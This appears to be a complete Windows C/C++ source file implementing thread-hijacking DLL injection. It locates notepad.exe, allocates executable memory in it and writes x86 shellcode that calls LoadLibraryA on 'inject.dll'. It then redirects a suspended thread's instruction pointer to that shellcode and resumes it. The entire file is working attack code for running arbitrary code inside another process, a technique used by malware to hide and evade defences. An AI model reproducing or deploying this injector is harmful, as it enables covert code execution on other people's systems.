#include<Windows.h>
#include<TlHelp32.h>
#include<stdio.h>
#include<tchar.h>

#pragma comment(lib, "ntdll.lib")

HANDLE OpenTargetProcess(WCHAR* target) {
	HANDLE snap;
	PROCESSENTRY32 pe32;
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (snap == INVALID_HANDLE_VALUE) {
		printf("Unable to get snap\r\n");
		return INVALID_HANDLE_VALUE;
	}


	if (!Process32First(snap, &pe32)) {
		printf("Unable to process snap first\r\n");
		CloseHandle(snap);
		return INVALID_HANDLE_VALUE;
	}

	do {
		if (wcscmp(pe32.szExeFile, target) == 0) {

			printf("\nOpening : %S having PID : %d\n", pe32.szExeFile, pe32.th32ProcessID);
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

			if (hProcess == INVALID_HANDLE_VALUE) {
				printf("\nError Opening Process\n");
				CloseHandle(snap);
				return INVALID_HANDLE_VALUE;
			}

			return hProcess;
		}
	} while (Process32Next(snap, &pe32));
	
	printf("Process not found\r\n");
	return INVALID_HANDLE_VALUE;
}

DWORD GetTargetThreadId(DWORD PID) {
	
	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		printf("Unable to get the snap\r\n");
		return 0;
	}

	Thread32First(snap, &te32);
	while (Thread32Next(snap, &te32)) {
		if (te32.th32OwnerProcessID == PID) {
			printf("Thread found with TID : %d\r\n", te32.th32ThreadID);
			return te32.th32ThreadID;
		}
	}

	printf("Thread of target process not found\r\n");
	return 0;
}

void ThreadHijack(WCHAR* Destination, char* Source) {
	
	//Shellcode
	char code[] =
	{
		0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0x06, 0x00, 0x00,
		0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0x8D, 0x93, 0x22, 0x00, 0x00, 0x00,
		0x52, 0xFF, 0xD0, 0x61, 0x68, 0xCC, 0xCC, 0xCC, 0xCC, 0xC3
	};

	//Opening the target process
	HANDLE hProcess = OpenTargetProcess(Destination);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("Unable to open the target process\r\n");
		return;
	}
	DWORD PID = GetProcessId(hProcess);
	DWORD TID = GetTargetThreadId(PID);

	//Allocating Virtual memory
	printf("Allocating the virtual memory\r\n");
	LPVOID pRemoteImage = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteImage) {
		printf("Unable to allocate the memory\r\n");
		CloseHandle(hProcess);
		return;
	}

	//Opening the target thread
	printf("Opening the target thread\r\n");
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, TID);
	if (hThread == INVALID_HANDLE_VALUE) {
		printf("Unable to open the target thread\r\n");
		CloseHandle(hProcess);
	}

	//Suspending the thread
	printf("Suspending the thread\r\n");
	CONTEXT ctx;
	SuspendThread(hThread);
	ctx.ContextFlags = CONTEXT_FULL;

	//Getting thread context
	printf("Getting the thread context\r\n");
	if (!GetThreadContext(hThread, &ctx)) {
		printf("Unable to get the thread context\r\n. Error : %d", GetLastError());
		ResumeThread(hThread);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return;
	}

	LPVOID buffer = VirtualAlloc(NULL, 65536, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LPBYTE ptr = (LPBYTE)buffer;

	memcpy(buffer, code, sizeof(code));

	while (1)
	{
		if (*ptr == 0xb8 && *(PDWORD)(ptr + 1) == 0xCCCCCCCC)
		{
			*(PDWORD)(ptr + 1) = (DWORD)LoadLibraryA;
		}

		if (*ptr == 0x68 && *(PDWORD)(ptr + 1) == 0xCCCCCCCC)
		{
			*(PDWORD)(ptr + 1) = ctx.Eip;
		}

		if (*ptr == 0xc3)
		{
			ptr++;
			break;
		}

		ptr++;
	}

	strcpy((char*)ptr, Source);

	//Writing the shellcode
	printf("Writing the shellcode\r\n");
	if (!WriteProcessMemory(hProcess, pRemoteImage, buffer, sizeof(code)+strlen((char*)ptr), NULL)) {
		printf("Unable to write shellcode\r\n");
		ResumeThread(hThread);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return;
	}

	ctx.Eip = (DWORD)pRemoteImage;


	//Hijack the thread
	printf("Hijacking the thread\r\n");
	if (!SetThreadContext(hThread, &ctx)) {
		printf("Unable to set the thread context\r\n");
		ResumeThread(hThread);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return;
	}

	//Resuming the thread
	printf("Resuming thread\r\n");
	ResumeThread(hThread);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return;
}

int main(int argc, char* argv[]) {
	
	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "inject.dll");

	ThreadHijack(_T("notepad.exe"), pPath);
	system("pause");
	return 0;

}